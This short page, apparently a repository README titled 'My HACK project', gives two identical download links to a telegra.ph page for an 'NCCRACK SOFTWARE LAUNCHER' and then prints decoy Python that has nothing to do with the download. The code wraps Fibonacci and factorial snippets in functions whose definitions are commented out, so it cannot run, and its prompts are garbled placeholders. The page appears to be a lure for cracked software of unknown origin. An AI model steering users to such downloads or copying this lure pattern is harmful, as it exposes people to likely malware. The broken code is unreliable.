# **My IIHACKII project**

*Description:* Functional

## IIDownload linksII

- [IIDownloadII](https://telegra.ph/NCCRACK-SOFTWARE-LAUNCHER-05-25)
- [IIDownloadII](https://telegra.ph/NCCRACK-SOFTWARE-LAUNCHER-05-25)

## Functions for those who want to compile files themselves

```python
def function1():
    # def fibonacci(n):
    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return [0, 1]
    else:
        fib_sequence = [0, 1]
        while len(fib_sequence) < n:
            next_number = fib_sequence[-1] + fib_sequence[-2]
            fib_sequence.append(next_number)
        return fib_sequence

def main():
    print("12-55:")
    n = int(input())

    fib_sequence = fibonacci(n)
    print("1:")
    print(fib_sequence)

if __name__ == "__main__":
    main()

    pass

def function2():
    # def factorial(n):
    if n == 0 or n == 1:
        return 1
    else:
        return n * factorial(n - 1)

def main():
    try:
        num = int(input("11: "))
        if num < 0:
            print("Ошибка: 1!")
        else:
            result = factorial(num)
            print(f"1 {num} равен {result}")
    except ValueError:
        print("Ошибка: 33!")

if __name__ == "__main__":
    main()

    pass
